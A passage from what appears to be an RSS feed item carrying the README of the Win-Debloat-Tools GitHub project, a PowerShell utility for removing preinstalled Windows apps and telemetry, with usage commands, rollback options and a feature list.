&lt;p&gt;This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.&lt;/p&gt; 
&lt;p&gt;This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.&lt;/p&gt; 
&lt;p&gt;You should have received a copy of the GNU General Public License along with this program. If not, see &lt;a href=&quot;http://www.gnu.org/licenses/&quot;&gt;http://www.gnu.org/licenses/&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>LeDragoX/Win-Debloat-Tools</title>
      <link>https://github.com/LeDragoX/Win-Debloat-Tools</link>
      <description>&lt;p&gt;Re-imagining Windows like a minimal OS install, already debloated with minimal impact for most functionality.&lt;/p&gt;&lt;hr&gt;&lt;h2 align=&quot;center&quot;&gt; &lt;img src=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/assets/script-logo.png&quot; style=&quot;vertical-align: bottom&quot; width=&quot;90%&quot;&gt; &lt;p&gt;&lt;a href=&quot;https://github.com/LeDragoX/Win-Debloat-Tools/actions/workflows/powershell.yaml&quot;&gt;&lt;img src=&quot;https://github.com/LeDragoX/Win-Debloat-Tools/actions/workflows/powershell.yaml/badge.svg?style=flat&quot; alt=&quot;PSScriptAnalyzer&quot;&gt;&lt;/a&gt; &lt;img src=&quot;https://img.shields.io/github/issues/LeDragoX/Win-Debloat-Tools?label=Issues&quot; alt=&quot;GitHub issues&quot;&gt; &lt;img src=&quot;https://img.shields.io/github/license/LeDragoX/Win-Debloat-Tools?color=blue&amp;amp;label=License&quot; alt=&quot;GitHub license&quot;&gt; &lt;a href=&quot;https://github.com/LeDragoX/Win-Debloat-Tools/commits/master&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/commit-activity/m/LeDragoX/Win-Debloat-Tools?label=Commit%20rate&quot; alt=&quot;Commit rate&quot;&gt;&lt;/a&gt; &lt;img src=&quot;https://img.shields.io/github/last-commit/LeDragoX/Win-Debloat-Tools/main?label=Last%20commit&quot; alt=&quot;GitHub last commit (branch)&quot;&gt; &lt;img src=&quot;https://img.shields.io/github/languages/code-size/LeDragoX/Win-Debloat-Tools?label=Code%20size&quot; alt=&quot;GitHub code size in bytes&quot;&gt;&lt;/p&gt; &lt;i&gt; This Project was adapted from &lt;a href=&quot;https://github.com/W4RH4WK/Debloat-Windows-10&quot;&gt;W4RH4WK&#39;s Project&lt;/a&gt; &lt;/i&gt; &lt;/h2&gt; 
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Re-imagining Windows like a minimal OS install, already debloated with minimal impact for most functionality.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!WARNING] &lt;strong&gt;DISCLAIMER:&lt;/strong&gt; &lt;em&gt;You&#39;re doing this at your own risk, I am not responsible for any data loss or damage that may occur. It&#39;s not guaranteed that every feature removed from the system can be easily restored.&lt;/em&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;🚀 Download Latest Version&lt;/h2&gt; 
&lt;p&gt;Code located in the &lt;code&gt;main&lt;/code&gt; branch is considered bleeding-edge, but big features/reworks will be implemented in a separate branch.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!IMPORTANT] &lt;em&gt;Use on a fresh Windows install to notice the differences. Using an admin account is recommended to avoid any compatibility issues.&lt;/em&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;div align=&quot;center&quot;&gt; 
 &lt;table&gt; 
  &lt;thead align=&quot;center&quot;&gt; 
   &lt;tr&gt; 
    &lt;th&gt;Branch to Download&lt;/th&gt; 
    &lt;th&gt;Version(s) Supported&lt;/th&gt; 
    &lt;th&gt;Edition(s)&lt;/th&gt; 
    &lt;th&gt;Architecture&lt;/th&gt; 
    &lt;th&gt;PowerShell Version&lt;/th&gt; 
   &lt;/tr&gt; 
  &lt;/thead&gt; 
  &lt;tbody align=&quot;center&quot;&gt; 
   &lt;tr&gt; 
    &lt;td&gt; &lt;h4&gt;&lt;a href=&quot;https://github.com/LeDragoX/Win-Debloat-Tools/archive/main.zip&quot;&gt;⬇️ Main&lt;/a&gt;&lt;/h4&gt;(Current) &lt;/td&gt; 
    &lt;td rowspan=&quot;2&quot;&gt;23H2 or Older&lt;/td&gt; 
    &lt;td rowspan=&quot;2&quot;&gt;Home / Pro&lt;/td&gt; 
    &lt;td rowspan=&quot;2&quot;&gt; x86/x64 ONLY&lt;br&gt; ARM/ARM64 will break your installation (&lt;a href=&quot;https://github.com/LeDragoX/Win-Debloat-Tools/issues/97&quot;&gt;#97&lt;/a&gt;) &lt;/td&gt; 
    &lt;td rowspan=&quot;2&quot;&gt;&lt;img width=&quot;20px&quot; src=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/assets/powershell-icon.png&quot; style=&quot;vertical-align: bottom&quot;&gt; v5.1+&lt;/td&gt; 
   &lt;/tr&gt; 
  &lt;/tbody&gt; 
 &lt;/table&gt; 
&lt;/div&gt; 
&lt;h2&gt;✨ Usage&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;To run a variant of the script, follow these steps:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Extract the &lt;strong&gt;entire&lt;/strong&gt; &lt;code&gt;.zip&lt;/code&gt; file to another folder.&lt;/li&gt; 
 &lt;li&gt;Run &lt;code&gt;OpenTerminalHere.cmd&lt;/code&gt; (try to &lt;code&gt;run as admin&lt;/code&gt; if nothing happens at all).&lt;/li&gt; 
 &lt;li&gt;Copy and Paste one of the lines below on your &lt;strong&gt;Terminal&lt;/strong&gt; to unblock the scripts and execute it:&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;GUI Version&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force; ls -Recurse *.ps*1 | Unblock-File; .\&quot;WinDebloatTools.ps1&quot;
&lt;/code&gt;&lt;/pre&gt; 
&lt;div align=&quot;center&quot;&gt; 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/assets/script-gui.png&quot; alt=&quot;Script GUI&quot;&gt; &lt;em&gt;The &lt;code&gt;Apply Tweaks&lt;/code&gt; button is the main one for debloating.&lt;/em&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;h3&gt;&lt;strong&gt;CLI Version&lt;/strong&gt; (Straight to debloat)&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-ps1&quot;&gt;Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force; ls -Recurse *.ps*1 | Unblock-File; .\&quot;WinDebloatTools.ps1&quot; &#39;CLI&#39;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts&quot;&gt;Scripts&lt;/a&gt; can be run individually, pick what you need.&lt;/strong&gt;&lt;/p&gt; 
&lt;h2&gt;🔄️ Roll-Back&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;If something breaks you can rely on:&lt;/strong&gt;&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;If you want &lt;strong&gt;(almost)&lt;/strong&gt; everything to it&#39;s original state, use the &lt;code&gt;Undo Tweaks&lt;/code&gt; button on &lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/WinDebloatTools.ps1&quot;&gt;&lt;code&gt;WinDebloatTools.ps1&lt;/code&gt;&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;A restoration point done by the script itself;&lt;/li&gt; 
 &lt;li&gt;The &lt;code&gt;Repair Windows&lt;/code&gt; button on &lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/WinDebloatTools.ps1&quot;&gt;&lt;code&gt;WinDebloatTools.ps1&lt;/code&gt;&lt;/a&gt;;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;☑️ Common Script Features&lt;/h2&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to expand&lt;/summary&gt; 
 &lt;p&gt;&lt;strong&gt;This part is also valid to the &lt;em&gt;Apply Tweaks&lt;/em&gt; button on the GUI.&lt;/strong&gt;&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;Import all necessary &lt;em&gt;modules&lt;/em&gt; before executing everything (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/lib/&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;Logs both script runs on &lt;code&gt;C:\Users\&amp;lt;&amp;lt;USERNAME&amp;gt;&amp;gt;\AppData\Local\Temp\Win-DT-Logs&lt;/code&gt;;&lt;/li&gt; 
  &lt;li&gt;Make a Restore Point and Backup the Hosts file (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Backup-System.ps1&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;Download AdwCleaner and Run the latest version for &lt;em&gt;Virus/Adware&lt;/em&gt; scan and from OOShutUp10 and import all Recommended settings from a file (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Invoke-DebloatSoftware.ps1&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;Disable &lt;em&gt;non-essential&lt;/em&gt; &lt;strong&gt;Telemetry&lt;/strong&gt; from &lt;strong&gt;Scheduled Tasks&lt;/strong&gt; and Optimize it (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Optimize-TaskScheduler.ps1&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;Disable &lt;em&gt;heavy&lt;/em&gt; &lt;strong&gt;Services&lt;/strong&gt;, but enable some on SSDs for optimum performance (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Optimize-ServicesRunning.ps1&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;Remove some of the legacy system components called as &quot;&lt;strong&gt;Capabilities&lt;/strong&gt;&quot;, except the most popular ones (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Remove-CapabilitiesList.ps1&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;Remove &lt;strong&gt;Bloatware UWP Apps&lt;/strong&gt; that comes with Windows 10+, except from my choice (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Remove-BloatwareAppsList.ps1&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;Optimize &lt;strong&gt;Privacy&lt;/strong&gt; by disabling more &lt;strong&gt;telemetry&lt;/strong&gt; parts and changing &lt;strong&gt;GPOs&lt;/strong&gt;, all through changing &lt;strong&gt;registry keys&lt;/strong&gt; (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Optimize-Privacy.ps1&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;Optimize &lt;strong&gt;Performance&lt;/strong&gt; by changing away from default settings that slowdowns the system, utilizing &lt;strong&gt;PowerShell commands&lt;/strong&gt; and &lt;strong&gt;changing registries&lt;/strong&gt; to disable features (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Optimize-Performance.ps1&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;Apply &lt;strong&gt;Personalization&lt;/strong&gt; tweaks on &lt;strong&gt;UI&lt;/strong&gt; and &lt;strong&gt;System Settings&lt;/strong&gt; via &lt;strong&gt;Registry&lt;/strong&gt; and &lt;strong&gt;PowerShell&lt;/strong&gt; commands (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Register-PersonalTweaksList.ps1&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;Help improve the &lt;strong&gt;Security&lt;/strong&gt; of Windows while maintaining performance (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Optimize-Security.ps1&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;Disable &lt;strong&gt;obsolete&lt;/strong&gt; Windows &lt;strong&gt;optional features&lt;/strong&gt; and enable some that might help (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Optimize-WindowsFeaturesList.ps1&quot;&gt;Source&lt;/a&gt;);&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;h2&gt;✅ GUI Script Features&lt;/h2&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to expand&lt;/summary&gt; 
 &lt;h3&gt;System Tweaks&lt;/h3&gt; 
 &lt;h4&gt;Customize System Features (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/utils/Individual-Tweaks.psm1&quot;&gt;Can be found here&lt;/a&gt;)&lt;/h4&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Dark Theme&lt;/code&gt;: Apply &lt;em&gt;Dark Theme&lt;/em&gt; or &lt;em&gt;Light Theme&lt;/em&gt; on Windows;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Activity History&lt;/code&gt;: Manages the &lt;strong&gt;Activity History&lt;/strong&gt; setting;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Background Apps&lt;/code&gt;: Manages &lt;em&gt;ALL&lt;/em&gt; the &lt;strong&gt;Background Apps&lt;/strong&gt; settings;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Clipboard History&lt;/code&gt;: Manages the &lt;strong&gt;Clipboard History&lt;/strong&gt; setting, that keeps a history from your clipboard pressing &lt;code&gt;Windows + V&lt;/code&gt; key;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Clipboard Sync Across Devices&lt;/code&gt;: Manages the &lt;strong&gt;Clipboard Sync Across Devices&lt;/strong&gt; setting, which allows to use the same clipboard for multiple devices (must be using a MS account);&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Cortana&lt;/code&gt;: Manages the &lt;strong&gt;Cortana&lt;/strong&gt; setting;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Hibernate&lt;/code&gt;: Manages the &lt;strong&gt;Hibernate&lt;/strong&gt; setting;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Legacy Context Menu&lt;/code&gt;: Bring back the Windows 10 &lt;strong&gt;context menu&lt;/strong&gt; from right-clicking or default on Windows 11;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Location Tracking&lt;/code&gt;: Allow or block &lt;strong&gt;location sensors and trackers&lt;/strong&gt; on Windows;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable News And Interest&lt;/code&gt;: Show or hide the &lt;strong&gt;temperature and climate&lt;/strong&gt; on the taskbar;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Old Volume Control&lt;/code&gt;: Manages the &lt;strong&gt;Old Volume Control (Win 7/8.1)&lt;/strong&gt; setting;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Online Speech Recognition&lt;/code&gt;: Manages the &lt;strong&gt;Online Speech Recognition&lt;/strong&gt; setting, by pressing the keys &lt;code&gt;Windows + H&lt;/code&gt; you can speak through your mic, then use it to type text using your voice;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Phone Link&lt;/code&gt;: Manages the &lt;strong&gt;Phone Link&lt;/strong&gt; setting, which can link your Android/iPhone devices notifications to Windows;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Photo Viewer&lt;/code&gt;: &lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/utils/enable-photo-viewer.reg&quot;&gt;&lt;em&gt;Enables&lt;/em&gt;&lt;/a&gt; or &lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/utils/disable-photo-viewer.reg&quot;&gt;&lt;em&gt;Disables&lt;/em&gt;&lt;/a&gt; the old &lt;strong&gt;Photo Viewer (Win 7/8.1)&lt;/strong&gt;;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Search App for Unknown Ext.&lt;/code&gt;: When running a unknown extension file, be able to search through &lt;strong&gt;MS Store&lt;/strong&gt; for an App that can open it.&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Telemetry&lt;/code&gt;: Manages the &lt;strong&gt;Windows Telemetry Level&lt;/strong&gt; setting;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable WSearch Service&lt;/code&gt;: Manages the &lt;strong&gt;Windows Search Service&lt;/strong&gt; setting;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Windows Spotlight&lt;/code&gt;: Manages the spotlight setting in personalization settings, giving a new desktop and lockscreen wallpaper daily;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Xbox Game Bar/DVR/Mode&lt;/code&gt;: Manages the &lt;strong&gt;Xbox Game Bar/DVR/Mode&lt;/strong&gt; setting, that can open Game Bar anywhere, record clips from games and change Game Mode;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;h4&gt;System Debloat Tools&lt;/h4&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;Apply Tweaks&lt;/code&gt;: Run every Common Tweak scripts (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/#%EF%B8%8F-common-script-features&quot;&gt;Go To &lt;strong&gt;☑️ Common Script Features&lt;/strong&gt; section&lt;/a&gt;);&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Undo Tweaks&lt;/code&gt;: Re-apply some tweaks and &lt;em&gt;Revert&lt;/em&gt; all possible ones, covering the, &lt;code&gt;ShutUp10 settings&lt;/code&gt;, &lt;code&gt;Scheduled Tasks&lt;/code&gt;, &lt;code&gt;Services&lt;/code&gt;, &lt;code&gt;Privacy and Performance&lt;/code&gt;, &lt;code&gt;Personal&lt;/code&gt; and &lt;code&gt;Optional Features&lt;/code&gt; tweaks, then try to &lt;code&gt;Reinstall Pre-Installed Apps&lt;/code&gt;;&lt;/li&gt; 
  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Remove-MSEdge.ps1&quot;&gt;&lt;code&gt;Remove Microsoft Edge&lt;/code&gt;&lt;/a&gt;: uninstalls &lt;strong&gt;Microsoft Edge&lt;/strong&gt;, disables Scheduled Tasks and Services related to Edge, then remove the remaining files, &lt;strong&gt;Edge Web View&lt;/strong&gt; files will remain untouched, but apps which depends on &lt;strong&gt;WebView2&lt;/strong&gt; will not install unless you install Microsoft Edge;&lt;/li&gt; 
  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Remove-OneDrive.ps1&quot;&gt;&lt;code&gt;Remove OneDrive&lt;/code&gt;&lt;/a&gt;: completely removes OneDrive from the System, re-install is possible via Win Store;&lt;/li&gt; 
  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Remove-Xbox.ps1&quot;&gt;&lt;code&gt;Remove Xbox&lt;/code&gt;&lt;/a&gt;: wipe Xbox Apps, disable Services related to Xbox and GameBar/GameDVR;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;h4&gt;Install System Apps (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/utils/Install-Individual-System-Apps.psm1&quot;&gt;Can be found here&lt;/a&gt;)&lt;/h4&gt; 
 &lt;p&gt;&lt;em&gt;This section contains options to restore the system apps, by downloading them from the &lt;strong&gt;MS Store&lt;/strong&gt; (mostly) and doing &lt;strong&gt;Stock configurations&lt;/strong&gt; (for some Apps).&lt;/em&gt;&lt;/p&gt; 
 &lt;blockquote&gt; 
  &lt;p&gt;The Xbox button uses a script to restore functionalities and reinstall the Xbox Apps available on MS Store.&lt;/p&gt; 
 &lt;/blockquote&gt; 
 &lt;h4&gt;Other Tools&lt;/h4&gt; 
 &lt;p&gt;&lt;em&gt;This section contains tools to solve some Windows problems and get info about how much debloated the system is.&lt;/em&gt;&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/other-scripts/New-SystemColor.ps1&quot;&gt;&lt;code&gt;Randomize System Color&lt;/code&gt;&lt;/a&gt;: Changes the Windows color pallette to a random generated hex color;&lt;/li&gt; 
  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Install-DefaultAppsList.ps1&quot;&gt;&lt;code&gt;Reinstall Pre-Installed Apps&lt;/code&gt;&lt;/a&gt;: Rebloat Windows with all the Pre-Installed Apps;&lt;/li&gt; 
  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/Repair-WindowsSystem.ps1&quot;&gt;&lt;code&gt;Repair Windows&lt;/code&gt;&lt;/a&gt;: Try to Completely fix the Windows worst problems via Command Line;&lt;/li&gt; 
  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/scripts/other-scripts/Show-DebloatInfo.ps1&quot;&gt;&lt;code&gt;Show Debloat Info&lt;/code&gt;&lt;/a&gt;: Make an overall check-up from disabled and enabled Windows Components (Compare before and after applying tweaks, it&#39;s a great difference);&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;h4&gt;Windows Update (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/utils/Individual-Tweaks.psm1&quot;&gt;Can be found here&lt;/a&gt;)&lt;/h4&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Automatic Windows Update&lt;/code&gt;: Set Windows updates to automatic or manual;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;h4&gt;Optional Features/Task Scheduler/Services/Windows Capabilities (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/utils/Individual-Tweaks.psm1&quot;&gt;Can be found here&lt;/a&gt;)&lt;/h4&gt; 
 &lt;p&gt;&lt;em&gt;These sections can manually adjust &lt;strong&gt;Features&lt;/strong&gt; from the system, working as a ON/OFF toggle.&lt;/em&gt;&lt;/p&gt; 
 &lt;h4&gt;Miscellaneous Features (&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/utils/Individual-Tweaks.psm1&quot;&gt;Can be found here&lt;/a&gt;)&lt;/h4&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Encrypted DNS&lt;/code&gt;: Sets the DNS Client Servers to &lt;strong&gt;Cloudflare&#39;s&lt;/strong&gt; and &lt;strong&gt;Google&#39;s&lt;/strong&gt; (ipv4 and ipv6), and enables &lt;strong&gt;DNS Over HTTPS&lt;/strong&gt; on &lt;em&gt;Windows 11&lt;/em&gt;.&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable God Mode&lt;/code&gt;: Manages the hidden Desktop folder called &quot;&lt;strong&gt;God Mode&lt;/strong&gt;&quot;;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Mouse Acceleration&lt;/code&gt;: Manages the &lt;strong&gt;Enhance Pointer Precision&lt;/strong&gt; setting from mouse settings;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Mouse Natural Scroll&lt;/code&gt;: Sets the mac-like mouse scrolling behavior, basically reverts mouse scroll direction;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Take Ownership menu&lt;/code&gt;: &lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/utils/enable-take-ownership-context-menu.reg&quot;&gt;&lt;em&gt;Enables&lt;/em&gt;&lt;/a&gt; or &lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/utils/disable-take-ownership-context-menu.reg&quot;&gt;&lt;em&gt;Disables&lt;/em&gt;&lt;/a&gt; the &lt;strong&gt;Take Ownership context menu&lt;/strong&gt;;&lt;/li&gt; 
  &lt;li&gt;&lt;code&gt;Enable/Disable Shutdown PC shortcut&lt;/code&gt;: Manages the &lt;strong&gt;Shutdown Computer desktop shortcut&lt;/strong&gt;;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;h3&gt;Software Install&lt;/h3&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/lib/package-managers/&quot;&gt;Install &lt;em&gt;Winget/Chocolatey&lt;/em&gt; package managers&lt;/a&gt;;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Be able to install the listed software in this script! Even from System apps.&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;Importante Note:&lt;/strong&gt; When proceeding to install a new app, the script will automatically install the required package manager for that operation.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/src/lib/package-managers/&quot;&gt;&lt;strong&gt;Create&lt;/strong&gt; or &lt;strong&gt;Remove&lt;/strong&gt; a Daily Upgrade Task for &lt;em&gt;Winget/Chocolatey&lt;/em&gt; packages&lt;/a&gt;;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Creates a new Scheduled Job to daily upgrade all available softwares via &lt;em&gt;Winget&lt;/em&gt; at &lt;strong&gt;12:00&lt;/strong&gt; and &lt;em&gt;Chocolatey&lt;/em&gt; at &lt;strong&gt;13:00&lt;/strong&gt;;&lt;/li&gt; 
    &lt;li&gt;Register daily upgrade logs on &lt;code&gt;C:\Users\&amp;lt;&amp;lt;USERNAME&amp;gt;&amp;gt;\AppData\Local\Temp\Win-DT-Logs&lt;/code&gt; and remove old log files;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;code&gt;Remove All Chocolatey Packages&lt;/code&gt;: List all packages from Chocolatey which are installed and remove everything at once;&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;code&gt;Upgrade All Softwares&lt;/code&gt;: Upgrades all Softwares installed on your machine installed through &lt;em&gt;Winget&lt;/em&gt; and &lt;em&gt;Chocolatey&lt;/em&gt;.&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;WSL will only update itself, not the distros installed.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;code&gt;Install Selected&lt;/code&gt;: Install the selected apps by marking the checkbox(es);&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;code&gt;Uninstall Mode&lt;/code&gt;: Default as OFF, clicking this will switch the &lt;code&gt;Install Selected&lt;/code&gt; button to &lt;code&gt;Uninstall Selected&lt;/code&gt; and uninstall every selected apps (&lt;strong&gt;Advice:&lt;/strong&gt; differently colored buttons may not be able to uninstall completely and WSL UWP Apps, but WSL Distros will be unregistered);&lt;/p&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;h2&gt;➕ Contributing&lt;/h2&gt; 
&lt;p&gt;FIRST of all, if have any &lt;em&gt;questions&lt;/em&gt; or &lt;em&gt;concerns&lt;/em&gt; about the project, please refer to the &lt;a href=&quot;https://github.com/LeDragoX/Win-Debloat-Tools/discussions/new/choose&quot;&gt;DISCUSSION&lt;/a&gt; page, not the &lt;strong&gt;ISSUES&lt;/strong&gt;, this helps keeping the project organized, thanks! Found a &lt;em&gt;bug&lt;/em&gt; or want a &lt;em&gt;new feature&lt;/em&gt;? You can open a new &lt;code&gt;Issue&lt;/code&gt; &lt;a href=&quot;https://github.com/LeDragoX/Win-Debloat-Tools/issues/new/choose&quot;&gt;here&lt;/a&gt;. Wanting to add &lt;em&gt;improvements&lt;/em&gt; or &lt;em&gt;fixes&lt;/em&gt;? Please check out the &lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/CONTRIBUTING.md&quot;&gt;CONTRIBUTING.md&lt;/a&gt; file.&lt;/p&gt; 
&lt;h2&gt;🤍 Credits&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Special thanks to &lt;a href=&quot;https://youtu.be/IU5F01oOzQQ?t=324&quot;&gt;LowSpecGamer&lt;/a&gt;, he is the reason i&#39;ve adapted this script.&lt;/li&gt; 
